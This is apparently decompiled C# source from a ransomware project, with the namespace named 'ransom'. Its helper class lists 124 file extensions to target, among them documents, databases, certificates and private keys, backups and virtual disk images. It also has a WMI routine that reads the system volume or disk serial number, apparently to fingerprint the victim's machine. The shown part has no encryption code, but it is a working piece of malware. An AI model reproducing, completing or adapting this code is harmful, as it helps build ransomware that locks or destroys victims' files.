using System;
using System.IO;
using System.Management;

namespace ransom;

internal class VariableHelper
{
	public static string[] Extensions = new string[124]
	{
		".exe", ".der", ".pfx", ".key", ".crt", ".csr", ".p12", ".pem", ".odt", ".sxw",
		".stw", ".3ds", ".max", ".3dm", ".ods", ".sxc", ".stc", ".dif", ".slk", ".wb2",
		".odp", ".sxd", ".std", ".sxm", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".dbf",
		".odb", ".mdf", ".ldf", ".cpp", ".pas", ".asm", ".cmd", ".bat", ".vbs", ".sch",
		".jsp", ".php", ".asp", ".java", ".jar", ".class", ".mp3", ".wav", ".swf", ".fla",
		".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".mkv", ".flv",
		".wma", ".mid", ".m3u", ".m4u", ".svg", ".psd", ".tiff", ".tif", ".raw", ".gif",
		".png", ".bmp", ".jpg", ".jpeg", ".iso", ".backup", ".zip", ".rar", ".tgz", ".tar",
		".bak", ".ARC", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".dwg", ".pdf",
		".wk1", ".wks", ".rtf", ".csv", ".txt", ".msg", ".pst", ".ppsx", ".ppsm", ".pps",
		".pot", ".pptm", ".pptx", ".ppt", ".xltm", ".xltx", ".xlc", ".xlm", ".xlt", ".xlw",
		".xlsb", ".xlsm", ".xlsx", ".xls", ".dotm", ".dot", ".docm", ".docx", ".doc", ".ndf",
		".pdf", ".ib", ".ibk", ".eject"
	};

	public static string GetHardSerialNumber()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_004c: Unknown result type (might be due to invalid IL or missing references)
		//IL_006b: Unknown result type (might be due to invalid IL or missing references)
		ManagementObject val = new ManagementObject("win32_logicaldisk.deviceid=\"" + Path.GetPathRoot(Environment.GetFolderPath(Environment.SpecialFolder.System))!.Remove(1, 2) + ":\"");
		val.Get();
		string text = ((ManagementBaseObject)val).get_Item("VolumeSerialNumber").ToString();
		if (!string.IsNullOrEmpty(text))
		{
			return text;
		}
		ManagementObjectSearcher val2 = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
		string result = "";
		ManagementObjectEnumerator enumerator = val2.Get().GetEnumerator();
		try
		{
			while (enumerator.MoveNext())
			{
				result = ((ManagementBaseObject)(ManagementObject)enumerator.get_Current()).get_Item("SerialNumber").ToString();
			}
			return result;
		}
		finally
		{
			((IDisposable)enumerator)?.Dispose();
		}
	}
}
